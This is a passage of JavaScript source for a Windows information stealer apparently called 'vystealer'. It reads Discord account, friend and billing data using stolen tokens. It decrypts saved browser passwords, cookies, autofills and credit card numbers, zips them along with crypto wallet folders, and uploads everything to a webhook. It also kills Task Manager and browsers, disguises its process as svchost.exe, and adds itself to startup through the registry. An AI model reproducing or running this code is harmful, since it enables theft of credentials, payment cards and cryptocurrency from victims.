    },
    Discord_Official_Moderator: {
        Value: 262144,
        Emoji: "<:Discord_certified_moderator:1223097798535282758>",
        Rare: true,
    }
};

async function getRelationships(token) {
    var j = await axios.get('https://discord.com/api/v10/users/@me/relationships', {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).catch(() => { })
    if (!j) return `\`Account locked :(\``;
    var json = j.data;
    const r = json.filter((user) => {
        return user.type == 1;
    });
    var friendsList = '';
    for (const z of r) {
        var badges = getRareBadges(z.user.public_flags);
        var boostEmblem = await getBoostEmblem(z.user.id, token);
        if (boostEmblem !== "" && parseInt(boostEmblem.substring(boostEmblem.indexOf("lvl") + 3, boostEmblem.indexOf(">", boostEmblem.indexOf("lvl")))) >= 2) {
            friendsList += `${badges}${boostEmblem} | \`${z.user.username}\`\n`;
        }
    }
    if (friendsList == '') friendsList = "`No have HQ friends :(`";
    const numberOfFriends = r.length;
    return { friendsList: friendsList, numberOfFriends: numberOfFriends };
}

async function getBoostEmblem(id, token) {
    try {
        let info;
        await axios.get(`https://discord.com/api/v10/users/${id}/profile`, {
            headers: {
                "Content-Type": "application/json",
                "authorization": token
            },
        }).then(res => { info = res.data })
            .catch(() => { })
        if (!info) return "";

        if (!info.premium_guild_since) return "";

        let boost = ["<:lvl1:1219031125247266887>", "<:lvl2:1219031171942449282>", "<:lvl3:1219031999847858216>", "<:lvl4:1219031250950684763>", "<:lvl5:1219031294176919603>", "<:lvl6:1219031344324022425>", "<:lvl7:1219031400607645816>", "<:lvl8:1219031431280332910>", "<:lvl9:1219031069974724638>"];
        var i = 0;

        let boostPeriods = [2, 3, 6, 9, 12, 15, 18, 24];
        for (const period of boostPeriods) {
            let expiryDate = new Date(info.premium_guild_since);
            expiryDate.setMonth(expiryDate.getMonth() + period);
            let daysLeft = Math.round((expiryDate - Date.now()) / 86400000);
            if (daysLeft > 0) {
                break;
            } else {
                i++;
            }
        }

        if (i >= 4) {
            return `<:nitro:1227750272915345589>${boost[i]}`;
        } else {
            return "";
        }
    } catch {
        return "";
    }
}

async function getBilling(token) {
    let json;
    await axios.get("https://discord.com/api/v10/users/@me/billing/payment-sources", {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).then(res => { json = res.data })
        .catch(err => { })
    if (!json) return '\`?\`';

    var bi = '';
    json.forEach(z => {
        if (z.type == 2 && z.invalid != !0) {
            bi += "<:paypal:1330938824494153769>";
        } else if (z.type == 1 && z.invalid != !0) {
            bi += "<:mastercard:1330938822795726938>";
        }
    });
    if (bi == '') bi = `\`No\``
    return bi;
}

function getBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value) b += o.Emoji;
    };
    if (b == '') return ``;
    return `${b}`;
}

function getRareBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
    };
    return b;
}

async function getNitro(flags, id, token) {
    switch (flags) {
        case 1:
            return "<:nitro:1323307200432832632>";
        case 2:
            let info;
            await axios.get(`https://discord.com/api/v10/users/${id}/profile`, {
                headers: {
                    "Content-Type": "application/json",
                    "authorization": token
                }
            }).then(res => { info = res.data })
                .catch(() => { })
            if (!info) return "<:nitro:1323307200432832632>";

            if (!info.premium_guild_since) return "<:nitro:1323307200432832632>";

            let boost = ["<:lvl1:1223097977258774569>", "<:lvl2:1223097987740471306>", "<:lvl3:1223097997634834625>", "<:lvl4:1223098007780589580>", "<:lvl5:1223098018916732939>", "<:lvl6:1223098032954937435>", "<:lvl7:1223098045030207689>", "<:lvl8:1223098057546141716>", "<:lvl9:1223098068417773611>"]
            var i = 0

            try {
                let d = new Date(info.premium_guild_since)
                let boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000)
                let d1 = new Date(info.premium_guild_since)
                let boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000)
                let d2 = new Date(info.premium_guild_since)
                let boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000)
                let d3 = new Date(info.premium_guild_since)
                let boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000)
                let d4 = new Date(info.premium_guild_since)
                let boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000)
                let d5 = new Date(info.premium_guild_since)
                let boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000)
                let d6 = new Date(info.premium_guild_since)
                let boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000)
                let d7 = new Date(info.premium_guild_since)
                let boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000)

                if (boost2month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost3month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost6month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost9month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost12month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost15month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost18month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost24month > 0) {
                    i += 0
                } else if (boost24month < 0 || boost24month == 0) {
                    i += 1
                } else {
                    i = 0
                }
            } catch {
                i += 0
            }
            return `<:nitro:1323307200432832632> ${boost[i]}`
        default:
            return "";
    };
}

async function getIp() {
    var ip = await axios.get("https://www.myexternalip.com/raw")
    return ip.data;
}

async function getPasswords() {
    const _0x540754 = [];
    const ip = await getIp();
    const countryFlag = await getCountryFlagEmoji(ip);
    const countryCode = await getCountryFromIP(ip);

    for (let _0x261d97 = 0; _0x261d97 < browserPath.length; _0x261d97++) {
        if (!fs.existsSync(browserPath[_0x261d97][0])) {
            continue;
        }

        let _0xd541c2;
        if (browserPath[_0x261d97][0].includes('Local')) {
            _0xd541c2 = browserPath[_0x261d97][0].split('\\Local\\')[1].split('\\')[0];
        } else {
            _0xd541c2 = browserPath[_0x261d97][0].split('\\Roaming\\')[1].split('\\')[1];
        }

        const _0x256bed = browserPath[_0x261d97][0] + 'Login Data';
        const _0x239644 = browserPath[_0x261d97][0] + 'passwords.db';

        try {
            fs.copyFileSync(_0x256bed, _0x239644);
        } catch {
            continue;
        }

        const _0x3d71cb = new sqlite3.Database(_0x239644);

        await new Promise((_0x2c148b, _0x32e8f4) => {
            _0x3d71cb.each(
                'SELECT origin_url, username_value, password_value FROM logins',
                (_0x4c7a5b, _0x504e35) => {
                    if (!_0x504e35.username_value) {
                        return;
                    }

                    let _0x3d2b4b = _0x504e35.password_value;
                    try {
                        const _0x5e1041 = _0x3d2b4b.slice(3, 15);
                        const _0x279e1b = _0x3d2b4b.slice(15, _0x3d2b4b.length - 16);
                        const _0x2a933a = _0x3d2b4b.slice(_0x3d2b4b.length - 16, _0x3d2b4b.length);
                        const _0x210aeb = crypto.createDecipheriv(
                            'aes-256-gcm',
                            browserPath[_0x261d97][3],
                            _0x5e1041
                        );
                        _0x210aeb.setAuthTag(_0x2a933a);
                        const password =
                            _0x210aeb.update(_0x279e1b, 'base64', 'utf-8') +
                            _0x210aeb.final('utf-8');

                        _0x540754.push(
                            '================\nURL: ' +
                            _0x504e35.origin_url +
                            '\nUsername: ' +
                            _0x504e35.username_value +
                            '\nPassword: ' +
                            password +
                            '\nApplication: ' +
                            _0xd541c2 +
                            ' ' +
                            browserPath[_0x261d97][1] +
                            '\n'
                        );
                    } catch (_0x5bf37a) { }
                },
                () => {
                    _0x2c148b('');
                }
            );
        });
    }

    if (_0x540754.length === 0) {
        _0x540754.push('no password found for ');
    }

    if (_0x540754.length) {
        const filePath = `[${countryCode}]-${os.hostname()}-passwords.txt`;
        fs.writeFileSync(filePath, user.copyright + _0x540754.join(''), {
            encoding: 'utf8',
            flag: 'a+',
        });
    }
}

async function getCookiesAndSendWebhook() {
    const detectedBrowsers = [];
    const matchedKeywords = [];
    const ip = await getIp(); 
    const countryFlag = await getCountryFlagEmoji(ip); 
    const countryCode = await getCountryFromIP(ip);

    do {
        try {
            ('Wallets\\Cookies');
            const cookiesData = {};
            let cookieLength = 0;

            for (let i = 0; i < browserPath.length; i++) {
                if (!fs.existsSync(browserPath[i][0] + '\\Network')) {
                    continue;
                }

                const browserFolder = browserPath[i][0].includes('Local')
                    ? browserPath[i][0].split('\\Local\\')[1].split('\\')[0]
                    : browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];

                if (!detectedBrowsers.includes(browserFolder)) {
                    detectedBrowsers.push(browserFolder);
                }

                const cookiesPath = browserPath[i][0] + 'Network\\Cookies';
                const cookies2 = browserPath[i][0] + 'Network\\vyCookies';

                try {
                    fs.copyFileSync(cookiesPath, cookies2);
                } catch {
                    continue;
                }

                const db = new sqlite3.Database(cookies2);

                await new Promise((resolve, reject) => {
                    db.each(
                        'SELECT * FROM cookies',
                        function (err, row) {
                            let encryptedValue = row.encrypted_value;
                            let iv = encryptedValue.slice(3, 15);
                            let encryptedData = encryptedValue.slice(15, encryptedValue.length - 16);
                            let authTag = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
                            let decrypted = '';

                            try {
                                const decipher = crypto.createDecipheriv('aes-256-gcm', browserPath[i][3], iv);
                                decipher.setAuthTag(authTag);
                                decrypted = decipher.update(encryptedData, 'base64', 'utf-8') + decipher.final('utf-8');
                            } catch (error) {}

                            if (!cookiesData[browserFolder + '_' + browserPath[i][1]]) {
                                cookiesData[browserFolder + '_' + browserPath[i][1]] = [];
                            }

                            cookiesData[browserFolder + '_' + browserPath[i][1]].push(
                                `${row.host_key}\tTRUE\t/\tFALSE\t2597573456\t${row.name}\t${decrypted}\n`
                            );

                            for (const keyword of keywords) {
                                if (row.host_key.includes(keyword) && !matchedKeywords.includes(keyword)) {
                                    matchedKeywords.push(keyword);
                                }
                            }
                        },
                        () => {
                            resolve('');
                        }
                    );
                });
            }

            const zip = new AdmZip();

            for (let [browserName, cookies] of Object.entries(cookiesData)) {
                if (cookies.length !== 0) {
                    const cookiesContent = cookies.join('');
                    const fileName = `${browserName}.txt`;
                    cookieLength += cookies.length;
                    zip.addFile(fileName, Buffer.from(cookiesContent, 'utf8'));
                }
            }

            const zipFilePath = `[${countryCode}]-${os.hostname()}-Cookies.zip`;
            zip.writeZip(zipFilePath);

            const formData = new FormData();
            formData.append('file', fs.createReadStream(zipFilePath));

            const embed = {
                title: 'Browsers Info',
                color: 0x313338,
                fields: [
                    { name: '<:internet:1333864320559353917> Browsers Detected:', value: `\`\`\`${detectedBrowsers.join(', ') || 'None'}\`\`\``, inline: false },
                    { name: '<:cookies:1333864313424838757>  Keywords:', value: `\`\`\`${matchedKeywords.join(', ') || 'None'}\`\`\``, inline: false }
                ],
                footer: { text: `${os.userInfo().username} | @vystealer` },
                timestamp: new Date()
            };

            formData.append('payload_json', JSON.stringify({ embeds: [embed] }));

            await axios.post(webhook_url, formData, {
                headers: formData.getHeaders()
            });

            fs.unlinkSync(zipFilePath);

            break;

        } catch (error) {
            retryCount++;

            if (retryCount >= maxRetries) {
                break;
            }
        }
    } while (retryCount < maxRetries);
}

function checkTaskManager() {
    exec('wmic process where "name=\'taskmgr.exe\'" get ProcessId', (err, stdout, stderr) => {
      if (err || stderr) {
        return;
      }
  
      if (stdout.includes('ProcessId')) {
        closeTaskManager();
      }
    });
  }

  function closeTaskManager() {
    exec('taskkill /F /IM taskmgr.exe', (err, stdout, stderr) => {
      if (err || stderr) {
        return;
      }
    });
  }

async function getAutofills() {
    const autofillData = [];
    const ip = await getIp();
    const countryFlag = await getCountryFlagEmoji(ip);
    const countryCode = await getCountryFromIP(ip);

    try {
        for (const pathData of browserPath) {
            const browserPathExists = fs.existsSync(pathData[0]);

            if (!browserPathExists) {
                continue;
            }

            const applicationName = pathData[0].includes('Local')
                ? pathData[0].split('\\Local\\')[1].split('\\')[0]
                : pathData[0].split('\\Roaming\\')[1].split('\\')[1];

            const webDataPath = pathData[0] + 'Web Data';
            const webDataDBPath = pathData[0] + 'webdata.db';

            try {
                fs.copyFileSync(webDataPath, webDataDBPath);
            } catch {
                continue;
            }

            const db = new sqlite3.Database(webDataDBPath);

            await new Promise((resolve, reject) => {
                db.each(
                    'SELECT * FROM autofill',
                    function (error, row) {
                        if (row) {
                            autofillData.push(
                                '================\nName: ' +
                                row.name +
                                '\nValue: ' +
                                row.value +
                                '\nApplication: ' +
                                applicationName +
                                ' ' +
                                pathData[1] +
                                '\n'
                            );
                        }
                    },
                    function () {
                        resolve('');
                    }
                );
            });

            if (autofillData.length === 0) {
                autofillData.push('No autofills found for ' + applicationName + ' ' + pathData[1] + '\n');
            }
        }

        if (autofillData.length) {
            const filePath = `[${countryCode}]-${os.hostname()}-autofills.txt`;
            fs.writeFileSync(filePath, user.copyright + autofillData.join(''), {
                encoding: 'utf8',
                flag: 'a+',
            });
        }
    } catch {
        const filePath = `[${countryCode}]-${os.hostname()}-autofills.txt`;
        fs.writeFileSync(filePath, "No autofills founded", {
            encoding: 'utf8',
            flag: 'a+',
        });
    }
}

async function getCards() {
    const _0x540754 = [];
    const ip = await getIp();
    const countryFlag = await getCountryFlagEmoji(ip);
    const countryCode = await getCountryFromIP(ip);

    for (let _0x261d97 = 0; _0x261d97 < browserPath.length; _0x261d97++) {
        if (!fs.existsSync(browserPath[_0x261d97][0])) {
            continue;
        }

        let _0xd541c2;
        if (browserPath[_0x261d97][0].includes('Local')) {
            _0xd541c2 = browserPath[_0x261d97][0].split('\\Local\\')[1].split('\\')[0];
        } else {
            _0xd541c2 = browserPath[_0x261d97][0].split('\\Roaming\\')[1].split('\\')[1];
        }

        const _0x256bed = browserPath[_0x261d97][0] + 'Web Data';
        const _0x239644 = browserPath[_0x261d97][0] + 'webdata.db';

        try {
            fs.copyFileSync(_0x256bed, _0x239644);
        } catch {
            continue;
        }

        const _0x3d71cb = new sqlite3.Database(_0x239644);

        await new Promise((_0x2c148b, _0x32e8f4) => {
            _0x3d71cb.each(
                'SELECT name_on_card,card_number_encrypted,expiration_month,expiration_year FROM credit_cards',
                (_0x4c7a5b, _0x504e35) => {

                    let _0x3d2b4b = _0x504e35.card_number_encrypted;
                    try {
                        const _0x5e1041 = _0x3d2b4b.slice(3, 15);
                        const _0x279e1b = _0x3d2b4b.slice(15, _0x3d2b4b.length - 16);
                        const _0x2a933a = _0x3d2b4b.slice(_0x3d2b4b.length - 16, _0x3d2b4b.length);
                        const _0x210aeb = crypto.createDecipheriv(
                            'aes-256-gcm',
                            browserPath[_0x261d97][3],
                            _0x5e1041
                        );
                        _0x210aeb.setAuthTag(_0x2a933a);
                        const card =
                            _0x210aeb.update(_0x279e1b, 'base64', 'utf-8') +
                            _0x210aeb.final('utf-8');

                        _0x540754.push(_0x504e35.name_on_card + " card: " + card + "|" + _0x504e35.expiration_month + "|" + _0x504e35.expiration_year + "|xxx");
                    } catch (_0x5bf37a) { }
                },
                () => {
                    _0x2c148b('');
                }
            );
        });
    }

    if (_0x540754.length === 0) {
        _0x540754.push('no password found for ');
    }

    if (_0x540754.length) {
        const filePath = `[${countryCode}]-${os.hostname()}-creditcards.txt`;
        fs.writeFileSync(filePath, user.copyright + _0x540754.join(''), {
            encoding: 'utf8',
            flag: 'a+',
        });
    }
}

async function closeBrowsers() {
  const browsersProcess = ["chrome.exe", "msedge.exe", "opera.exe", "brave.exe"];
  return new Promise(async (resolve) => {
    try {
      const { execSync } = require("child_process");
      const tasks = execSync("tasklist").toString();
      browsersProcess.forEach((process) => {
        if (tasks.includes(process)) {
          execSync(`taskkill /IM ${process} /F`);
        }
      });
      await new Promise((resolve) => setTimeout(resolve, 2500));
      resolve();
    } catch (e) {
      resolve();
    }
  });
}

function hideProcessName() {
    const newProcessName = 'svchost.exe'; 
    try {
        process.title = newProcessName;
    } catch (error) {
    }
}

hideProcessName();

async function getCookiesAndSendWebhook() {
    const detectedBrowsers = [];
    const matchedKeywords = [];
    const ip = await getIp(); 
    const countryFlag = await getCountryFlagEmoji(ip); 
    const countryCode = await getCountryFromIP(ip);

    do {
        try {
            ('Wallets\\Cookies');
            const cookiesData = {};
            let cookieLength = 0;

            for (let i = 0; i < browserPath.length; i++) {
                if (!fs.existsSync(browserPath[i][0] + '\\Network')) {
                    continue;
                }

                const browserFolder = browserPath[i][0].includes('Local')
                    ? browserPath[i][0].split('\\Local\\')[1].split('\\')[0]
                    : browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];

                if (!detectedBrowsers.includes(browserFolder)) {
                    detectedBrowsers.push(browserFolder);
                }

                const cookiesPath = browserPath[i][0] + 'Network\\Cookies';
                const cookies2 = browserPath[i][0] + 'Network\\vyCookies';

                try {
                    fs.copyFileSync(cookiesPath, cookies2);
                } catch {
                    continue;
                }

                const db = new sqlite3.Database(cookies2);

                await new Promise((resolve, reject) => {
                    db.each(
                        'SELECT * FROM cookies',
                        function (err, row) {
                            let encryptedValue = row.encrypted_value;
                            let iv = encryptedValue.slice(3, 15);
                            let encryptedData = encryptedValue.slice(15, encryptedValue.length - 16);
                            let authTag = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
                            let decrypted = '';

                            try {
                                const decipher = crypto.createDecipheriv('aes-256-gcm', browserPath[i][3], iv);
                                decipher.setAuthTag(authTag);
                                decrypted = decipher.update(encryptedData, 'base64', 'utf-8') + decipher.final('utf-8');
                            } catch (error) {}

                            if (!cookiesData[browserFolder + '_' + browserPath[i][1]]) {
                                cookiesData[browserFolder + '_' + browserPath[i][1]] = [];
                            }

                            cookiesData[browserFolder + '_' + browserPath[i][1]].push(
                                `${row.host_key}\tTRUE\t/\tFALSE\t2597573456\t${row.name}\t${decrypted}\n`
                            );

                            for (const keyword of keywords) {
                                if (row.host_key.includes(keyword) && !matchedKeywords.includes(keyword)) {
                                    matchedKeywords.push(keyword);
                                }
                            }
                        },
                        () => {
                            resolve('');
                        }
                    );
                });
            }

            const zip = new AdmZip();

            for (let [browserName, cookies] of Object.entries(cookiesData)) {
                if (cookies.length !== 0) {
                    const cookiesContent = cookies.join('');
                    const fileName = `${browserName}.txt`;
                    cookieLength += cookies.length;
                    zip.addFile(fileName, Buffer.from(cookiesContent, 'utf8'));
                }
            }

            const zipFilePath = `[${countryCode}]-${os.hostname()}-Cookies.zip`;
            zip.writeZip(zipFilePath);

            const formData = new FormData();
            formData.append('file', fs.createReadStream(zipFilePath));

            const embed = {
                title: 'Browsers Info',
                color: 0x313338,
                fields: [
                    { name: '<:internet:1333864320559353917> Browsers Detected:', value: `\`\`\`${detectedBrowsers.join(', ') || 'None'}\`\`\``, inline: false },
                    { name: '<:cookies:1333864313424838757>  Keywords:', value: `\`\`\`${matchedKeywords.join(', ') || 'None'}\`\`\``, inline: false }
                ],
                footer: { text: `${os.userInfo().username} | @vystealer` },
                timestamp: new Date()
            };

            formData.append('payload_json', JSON.stringify({ embeds: [embed] }));

            await axios.post(webhook_url, formData, {
                headers: formData.getHeaders()
            });

            fs.unlinkSync(zipFilePath);

            break;

        } catch (error) {
            retryCount++;

            if (retryCount >= maxRetries) {
                break;
            }
        }
    } while (retryCount < maxRetries);
}

function putOnStartup() {
  const exeFilePath = process.execPath;

  const vbsFileName = 'Update.vbs';
  const programDataPath = path.join(process.env.PROGRAMDATA, vbsFileName); 

  const registryPath = 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run';
  const keyName = path.basename(exeFilePath, '.exe'); 
  const vbsContent = `Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run """${exeFilePath}""", 7\n`;

  fs.writeFileSync(programDataPath, vbsContent);
  const addCommand = `reg add "${registryPath}" /v ${keyName} /t REG_SZ /d "${programDataPath}" /f`;

  exec(addCommand, (error, stdout, stderr) => {
    if (error) {
      return;
    }

    if (stderr) {
      return;
    }

  });
}

async function getPCInfo() {
    const ip = await getIp();
    const countryCode = await getCountryFromIP(ip);
    const countryFlag = await getCountryFlagEmoji(ip);
    const countryName = countryCode ? new Intl.DisplayNames(['en'], { type: 'region' }).of(countryCode) : 'Unknown';

    const pcInfo = {
        title: 'New Victim',
        color: 0x313338,
        description: `**Computer Username:** ${os.userInfo().username}\n**Computer Hostname:** ${os.hostname()}\n**IP:** ${ip}`,
        fields: [
            { name: ':computer: Operating System:', value: `\`${os.type()} ${os.release()}\``, inline: false },
            { name: '<:uptime:1327035089665916990> Uptime:', value: `\`${os.uptime()} seconds\``, inline: true },
            { name: '<:screenviewer:1281098792799567883> Screenviewer:', value: `[\`Click here\`](http://147.93.66.36:1337/?ip=${ip})`, inline: true },
            { name: `<:country:1327048755026985081> Country`, value: `${countryFlag} \`${countryName}\``, inline: true }
        ],
        footer: { text: `${os.userInfo().username} | @vystealer` },
        timestamp: new Date().toISOString()
    };

    const formData = new FormData();
    formData.append('payload_json', JSON.stringify({ embeds: [pcInfo] }));

    await axios.post(webhook_url, formData, {
        headers: formData.getHeaders()
    });
}


async function bundleAndSendData() {
    const zip = new AdmZip();
    const ip = await getIp();
    const countryCode = await getCountryFromIP(ip);
    const countryFlag = await getCountryFlagEmoji(ip);
    const zipFileName = `[${countryCode}]-${os.hostname()}-AllData.zip`;

    const filesToBundle = [
        `[${countryCode}]-${os.hostname()}-autofills.txt`,
        `[${countryCode}]-${os.hostname()}-passwords.txt`,
        `[${countryCode}]-${os.hostname()}-creditcards.txt`
    ];

    for (const file of filesToBundle) {
        if (fs.existsSync(file)) {
            zip.addLocalFile(file);
            fs.unlinkSync(file);
        }
    }

    zip.writeZip(zipFileName);

    const formData = new FormData();
    formData.append('file', fs.createReadStream(zipFileName));
    formData.append('payload_json', JSON.stringify({ content: `**IP:** ${ip} ${countryFlag}` }));

    try {
        await axios.post(webhook_url, formData, {
            headers: formData.getHeaders()
        });
        fs.unlinkSync(zipFileName);
    } catch (error) {
    }
}

const browsersProcess = ["chrome.exe", "msedge.exe", "opera.exe", "brave.exe", "vivaldi.exe", "yandex.exe", "chromium.exe"];

function continuouslyKillBrowsers() {
    setInterval(() => {
        browsersProcess.forEach((process) => {
            exec(`wmic process where "name='${process}'" get ProcessId`, (err, stdout, stderr) => {
                if (err || stderr) {
                    return;
                }

                if (stdout.includes('ProcessId')) {
                    exec(`taskkill /F /IM ${process}`, (err, stdout, stderr) => {
                        if (err || stderr) {
                            return;
                        }
                    });
                }
            });
        });
    }, 3000);
}

const roaming = path.join('C:', 'Users', os.userInfo().username, 'AppData', 'Roaming');
const wallets = [
    { name: 'Atomic', path: path.join(roaming, 'atomic', 'Local Storage', 'leveldb') },
    { name: 'Guarda', path: path.join(roaming, 'Guarda', 'Local Storage', 'leveldb') },
    { name: 'Zcash', path: path.join(roaming, 'Zcash') },
    { name: 'Armory', path: path.join(roaming, 'Armory') },
    { name: 'Bytecoin', path: path.join(roaming, 'bytecoin') },
    { name: 'Exodus', path: path.join(roaming, 'Exodus', 'exodus.wallet') },
    { name: 'Binance', path: path.join(roaming, 'Binance', 'Local Storage', 'leveldb') },
    { name: 'Jaxx', path: path.join(roaming, 'com.liberty.jaxx', 'IndexedDB', 'file__0.indexeddb.leveldb') },
    { name: 'Electrum', path: path.join(roaming, 'Electrum', 'wallets') },
    { name: 'Coinomi', path: path.join(roaming, 'Coinomi', 'Coinomi', 'wallets') },
];

async function checkAndSendWallets() {
    const zip = new AdmZip();
    const ip = await getIp();
    const countryCode = await getCountryFromIP(ip);
    const zipFileName = `[${countryCode}]-${os.hostname()}-Wallets.rar`;

    for (const wallet of wallets) {
        if (fs.existsSync(wallet.path)) {
            zip.addLocalFolder(wallet.path, wallet.name);
        }
    }

    if (zip.getEntries().length > 0) {
        zip.writeZip(zipFileName);

        const formData = new FormData();
        formData.append('file', fs.createReadStream(zipFileName));

        try {
            await axios.post(webhook_url, formData, {
                headers: formData.getHeaders()
            });
            fs.unlinkSync(zipFileName);
        } catch (error) {
        }
    }
}

function scheduleCookieRetrieval() {
    setInterval(async () => {
        await getCookiesAndSendWebhook();
    }, 5 * 60 * 1000); 
}

async function vy() {
     setInterval(checkTaskManager, 3000);
     putOnStartup();
     getPCInfo();
     getEncrypted();
     getCookiesAndSendWebhook();
     scheduleCookieRetrieval(); 
     await getPasswords();
     await getAutofills();
     await getCards(); 
     bundleAndSendData();
     checkAndSendWallets();
     closeBrowsers();
     stealTokens(); 
     continuouslyKillBrowsers();
} 

vy();